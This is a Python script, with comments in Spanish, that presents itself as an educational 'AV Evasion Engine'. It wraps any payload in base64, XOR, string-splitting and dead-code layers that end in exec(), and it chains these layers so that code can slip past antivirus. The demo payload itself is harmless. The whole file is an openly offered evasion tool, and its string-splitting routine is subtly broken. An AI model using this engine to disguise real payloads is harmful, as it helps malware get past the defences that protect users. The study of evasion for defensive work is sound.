
#!/usr/bin/env python3
"""
AV Evasion Engine v1.0
Motor educativo de evasi√≥n de antivirus con t√©cnicas de ofuscaci√≥n
Author: @descambiado
"""

import base64
import random
import string
import binascii
import hashlib
import os
from typing import List, Dict, Any

class AVEvasionEngine:
    def __init__(self):
        self.techniques = [
            "base64_encoding",
            "xor_obfuscation", 
            "string_splitting",
            "variable_renaming",
            "dead_code_insertion",
            "api_hashing"
        ]
        
    def generate_random_string(self, length: int = 8) -> str:
        """Genera string aleatorio"""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
    
    def base64_encode_payload(self, payload: str) -> Dict[str, str]:
        """Codifica payload en base64"""
        encoded = base64.b64encode(payload.encode()).decode()
        
        obfuscated_code = f"""
import base64
{self.generate_random_string()} = "{encoded}"
exec(base64.b64decode({self.generate_random_string()}).decode())
"""
        return {
            "technique": "Base64 Encoding",
            "original_size": len(payload),
            "obfuscated_size": len(obfuscated_code),
            "code": obfuscated_code
        }
    
    def xor_obfuscation(self, payload: str, key: int = None) -> Dict[str, str]:
        """Ofuscaci√≥n XOR"""
        if key is None:
            key = random.randint(1, 255)
            
        xor_result = ''.join(chr(ord(c) ^ key) for c in payload)
        encoded = base64.b64encode(xor_result.encode('latin-1')).decode()
        
        obfuscated_code = f"""
import base64
{self.generate_random_string()} = {key}
{self.generate_random_string()} = "{encoded}"
exec(''.join(chr(ord(c) ^ {key}) for c in base64.b64decode({self.generate_random_string()}).decode('latin-1')))
"""
        return {
            "technique": "XOR Obfuscation",
            "key": key,
            "code": obfuscated_code
        }
    
    def string_splitting(self, payload: str) -> Dict[str, str]:
        """Divisi√≥n de strings"""
        parts = [payload[i:i+10] for i in range(0, len(payload), 10)]
        var_names = [self.generate_random_string() for _ in parts]
        
        assignments = '\n'.join(f"{var} = '{part}'" for var, part in zip(var_names, parts))
        execution = f"exec({''.join(var_names)})"
        
        obfuscated_code = f"{assignments}\n{execution}"
        
        return {
            "technique": "String Splitting",
            "parts": len(parts),
            "code": obfuscated_code
        }
    
    def dead_code_insertion(self, payload: str) -> Dict[str, str]:
        """Inserci√≥n de c√≥digo muerto"""
        dead_code_snippets = [
            "import time; time.sleep(0)",
            "import os; os.path.exists('/')",
            f"{self.generate_random_string()} = 42",
            "import sys; len(sys.path)",
            f"'{self.generate_random_string()}' == 'fake'"
        ]
        
        dead_code = '\n'.join(random.choices(dead_code_snippets, k=3))
        
        obfuscated_code = f"""
{dead_code}
# Real payload hidden in dead code
exec('''{payload}''')
{dead_code}
"""
        return {
            "technique": "Dead Code Insertion",
            "dead_lines": 6,
            "code": obfuscated_code
        }
    
    def api_hashing(self, api_calls: List[str]) -> Dict[str, Any]:
        """Hashing de llamadas API"""
        hash_map = {}
        for api in api_calls:
            hash_val = hashlib.md5(api.encode()).hexdigest()[:8]
            hash_map[hash_val] = api
            
        resolver_code = f"""
import hashlib
api_map = {hash_map}
def resolve_api(hash_val):
    return api_map.get(hash_val, 'unknown')
"""
        
        return {
            "technique": "API Hashing",
            "hash_map": hash_map,
            "resolver": resolver_code
        }
    
    def evade_payload(self, payload: str, techniques: List[str] = None) -> Dict[str, Any]:
        """Evade payload usando m√∫ltiples t√©cnicas"""
        if techniques is None:
            techniques = random.sample(self.techniques, 2)
            
        results = {
            "original_payload": payload,
            "techniques_used": techniques,
            "evasion_results": []
        }
        
        current_payload = payload
        
        for technique in techniques:
            if technique == "base64_encoding":
                result = self.base64_encode_payload(current_payload)
            elif technique == "xor_obfuscation":
                result = self.xor_obfuscation(current_payload)
            elif technique == "string_splitting":
                result = self.string_splitting(current_payload)
            elif technique == "dead_code_insertion":
                result = self.dead_code_insertion(current_payload)
            else:
                continue
                
            results["evasion_results"].append(result)
            current_payload = result["code"]
            
        results["final_payload"] = current_payload
        return results

def main():
    """Funci√≥n principal educativa"""
    engine = AVEvasionEngine()
    
    # Payload educativo de ejemplo
    sample_payload = """
print("Educational AV Evasion Demo")
import socket
print("Simulating network connection test")
"""
    
    print("üîí AV Evasion Engine v1.0")
    print("=" * 40)
    print("‚ö†Ô∏è SOLO PARA FINES EDUCATIVOS")
    print("=" * 40)
    
    # Demostrar t√©cnicas
    techniques_demo = [
        "base64_encoding",
        "xor_obfuscation", 
        "string_splitting",
        "dead_code_insertion"
    ]
    
    for technique in techniques_demo:
        print(f"\nüîß Demostrando: {technique}")
        print("-" * 30)
        
        if technique == "base64_encoding":
            result = engine.base64_encode_payload(sample_payload)
        elif technique == "xor_obfuscation":
            result = engine.xor_obfuscation(sample_payload)
        elif technique == "string_splitting":
            result = engine.string_splitting(sample_payload)
        elif technique == "dead_code_insertion":
            result = engine.dead_code_insertion(sample_payload)
            
        print(f"T√©cnica: {result['technique']}")
        print(f"C√≥digo ofuscado:\n{result['code'][:200]}...")
    
    # Evasi√≥n completa
    print(f"\nüöÄ EVASI√ìN COMPLETA")
    print("=" * 40)
    
    full_result = engine.evade_payload(sample_payload, ["base64_encoding", "dead_code_insertion"])
    
    print(f"T√©cnicas usadas: {', '.join(full_result['techniques_used'])}")
    print(f"Payload original: {len(full_result['original_payload'])} caracteres")
    print(f"Payload final: {len(full_result['final_payload'])} caracteres")
    
    print("\n‚úÖ Demo completada - Solo para educaci√≥n en seguridad")

if __name__ == "__main__":
    main()
